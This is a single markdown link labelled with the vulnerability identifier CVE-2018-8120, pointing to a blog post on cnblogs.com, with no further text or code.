[CVE-2018-8120](https://www.cnblogs.com/DreamoneOnly/p/11444172.html)
